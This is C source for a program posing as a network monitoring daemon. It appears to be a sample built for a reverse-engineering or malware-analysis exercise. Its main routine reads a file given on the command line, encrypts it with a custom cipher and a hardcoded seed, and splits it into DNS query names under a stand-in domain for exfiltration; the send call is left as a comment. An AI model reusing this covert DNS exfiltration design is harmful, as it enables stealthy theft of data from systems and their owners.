/*
 * netmond - Network Monitoring Daemon v2.1.4
 * Internal diagnostic and telemetry agent
 *
 * Compiled during Docker build, stripped, placed at /app/sample_alpha.
 * Source is NOT available in the final image.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ========================================
 * CRC32 — configuration integrity check
 * ======================================== */

static uint32_t g_crc_table[256];

static void crc_table_init(void) {
    uint32_t i, j, c;
    for (i = 0; i < 256; i++) {
        c = i;
        for (j = 0; j < 8; j++)
            c = (c >> 1) ^ (0xEDB88320U & (uint32_t)(-(int32_t)(c & 1)));
        g_crc_table[i] = c;
    }
}

static uint32_t crc32(const uint8_t *buf, size_t len) {
    uint32_t c = 0xFFFFFFFFU;
    size_t i;
    for (i = 0; i < len; i++)
        c = g_crc_table[(c ^ buf[i]) & 0xFF] ^ (c >> 8);
    return c ^ 0xFFFFFFFFU;
}

/* ========================================
 * Feistel block cipher — config storage
 * and operational heartbeat channel
 * ======================================== */

static uint32_t feistel_f(uint32_t x, uint32_t subkey) {
    x ^= subkey;
    x = (x << 7) | (x >> 25);
    x *= 0x01000193U;
    return x;
}

__attribute__((noinline))
static void feistel_enc(uint32_t block[2], const uint32_t key[4]) {
    uint32_t l = block[0], r = block[1], t;
    int i;
    for (i = 0; i < 16; i++) {
        t = r;
        r = l ^ feistel_f(r, key[i & 3]);
        l = t;
    }
    block[0] = r;
    block[1] = l;
}

/* ========================================
 * Block transform — data channel
 * Key-adaptive round constant
 * ======================================== */

__attribute__((noinline))
static void transform_block(uint32_t v[2], const uint32_t k[4]) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0;
    uint32_t delta = (k[0] ^ k[2]) | 0x80000001U;
    unsigned int i;
    for (i = 0; i < 32; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
    }
    v[0] = v0;
    v[1] = v1;
}

/* ========================================
 * Base32 encoding
 * ======================================== */

static const char g_b32[] = "abcdefghijklmnopqrstuvwxyz234567";

static size_t b32enc(const uint8_t *data, size_t len, char *out) {
    size_t oi = 0, i;
    int bits = 0;
    unsigned int acc = 0;
    for (i = 0; i < len; i++) {
        acc = (acc << 8) | data[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            out[oi++] = g_b32[(acc >> bits) & 0x1F];
        }
        acc &= (1u << bits) - 1;
    }
    if (bits > 0)
        out[oi++] = g_b32[(acc << (5 - bits)) & 0x1F];
    out[oi] = '\0';
    return oi;
}

/* ========================================
 * Session key management
 * ======================================== */

static uint32_t g_skey[4];

__attribute__((noinline))
static void init_session(const uint8_t *seed, size_t len) {
    uint32_t h = 0x811c9dc5U;
    size_t i;
    memset(g_skey, 0, sizeof(g_skey));
    for (i = 0; i < len; i++) {
        h ^= seed[i];
        h *= 0x01000193U;
        g_skey[i & 3] ^= h;
    }
}

/* ========================================
 * DNS exfiltration channel
 * ======================================== */

__attribute__((noinline))
static int dns_send(const uint8_t *data, size_t len) {
    size_t padded = (len + 7) & ~(size_t)7;
    uint8_t *buf = (uint8_t *)calloc(1, padded);
    size_t i, elen, off, seq, take;
    char enc[2048];
    char qn[256];
    char chunk[64];

    if (!buf) return -1;
    memcpy(buf, data, len);

    /* Encrypt each 8-byte block */
    for (i = 0; i < padded; i += 8)
        transform_block((uint32_t *)(buf + i), g_skey);

    /* Base32 encode */
    b32enc(buf, padded, enc);

    /* Send as DNS queries with sequence numbers */
    elen = strlen(enc);
    for (off = 0, seq = 0; off < elen; off += 50, seq++) {
        take = elen - off;
        if (take > 50) take = 50;
        memcpy(chunk, enc + off, take);
        chunk[take] = '\0';
        snprintf(qn, sizeof(qn), "%zu-%s.cdn-telemetry.example.com",
                 seq, chunk);
        /* In production: sendto(dns_socket, ...) */
        (void)qn;
    }

    free(buf);
    return 0;
}

/* ========================================
 * DNS heartbeat channel — operational status
 * Uses Feistel cipher with config key
 * ======================================== */

__attribute__((noinline))
static int dns_heartbeat(const uint8_t *status, size_t len,
                         const uint32_t key[4]) {
    size_t padded = (len + 7) & ~(size_t)7;
    uint8_t *buf = (uint8_t *)calloc(1, padded);
    size_t i, elen, off, seq, take;
    char enc[2048];
    char qn[256];
    char chunk[64];

    if (!buf) return -1;
    memcpy(buf, status, len);

    /* Encrypt each 8-byte block with Feistel */
    for (i = 0; i < padded; i += 8)
        feistel_enc((uint32_t *)(buf + i), key);

    /* Base32 encode */
    b32enc(buf, padded, enc);

    /* Send as DNS queries with sequence numbers */
    elen = strlen(enc);
    for (off = 0, seq = 0; off < elen; off += 50, seq++) {
        take = elen - off;
        if (take > 50) take = 50;
        memcpy(chunk, enc + off, take);
        chunk[take] = '\0';
        snprintf(qn, sizeof(qn), "%zu-%s.api-metrics.example.com",
                 seq, chunk);
        (void)qn;
    }

    free(buf);
    return 0;
}

/* ========================================
 * Agent configuration
 * ======================================== */

struct agent_cfg {
    char server[64];
    uint32_t port;
    uint32_t interval;
    uint32_t flags;
    uint32_t crc;
};

static void store_config(struct agent_cfg *cfg, const uint32_t key[4]) {
    uint32_t *p = (uint32_t *)cfg;
    size_t n = sizeof(*cfg) / 8;
    size_t i;
    for (i = 0; i < n; i++)
        feistel_enc(p + i * 2, key);
}

/* ========================================
 * Logging
 * ======================================== */

static void log_event(const char *tag, const char *msg) {
    printf("[%s] %s\n", tag, msg);
}

/* ========================================
 * Health check
 * ======================================== */

static int health_check(const struct agent_cfg *cfg) {
    uint32_t computed = crc32((const uint8_t *)cfg,
                              sizeof(*cfg) - sizeof(cfg->crc));
    return computed == cfg->crc;
}

/* ========================================
 * Entry point
 * ======================================== */

int main(int argc, char **argv) {
    struct agent_cfg cfg;
    uint32_t ckey[4] = {0xA1B2C3D4U, 0xE5F60718U, 0x293A4B5CU, 0x6D7E8F90U};
    static const uint8_t seed[] = "agent-session-2024-rev3";
    FILE *fp;
    long sz;
    uint8_t *data;
    char hb_msg[80];

    crc_table_init();

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target-path>\n", argv[0]);
        return 1;
    }

    /* Session setup */
    init_session(seed, sizeof(seed) - 1);

    /* Configuration */
    memset(&cfg, 0, sizeof(cfg));
    strncpy(cfg.server, "monitor.internal.net", sizeof(cfg.server) - 1);
    cfg.port = 8443;
    cfg.interval = 30;
    cfg.flags = 0x07;
    cfg.crc = crc32((uint8_t *)&cfg, sizeof(cfg) - sizeof(cfg.crc));

    log_event("*", "netmond v2.1.4 starting");

    if (!health_check(&cfg)) {
        log_event("-", "config integrity failure");
        return 1;
    }

    /* Operational heartbeat (Feistel cipher via api-metrics channel) */
    snprintf(hb_msg, sizeof(hb_msg), "UP:%s:%u:%u:%u",
             cfg.server, cfg.port, cfg.interval, cfg.flags);
    dns_heartbeat((uint8_t *)hb_msg, strlen(hb_msg), ckey);

    /* Secure config storage (uses Feistel cipher) */
    store_config(&cfg, ckey);

    /* Read target file */
    fp = fopen(argv[1], "r");
    if (!fp) {
        log_event("-", "cannot open target");
        return 1;
    }
    fseek(fp, 0, SEEK_END);
    sz = ftell(fp);
    rewind(fp);
    data = (uint8_t *)malloc(sz);
    if (!data) { fclose(fp); return 1; }
    fread(data, 1, sz, fp);
    fclose(fp);

    /* Exfiltrate via DNS channel (uses transform_block cipher) */
    dns_send(data, (size_t)sz);

    free(data);
    log_event("*", "diagnostic complete");
    return 0;
}
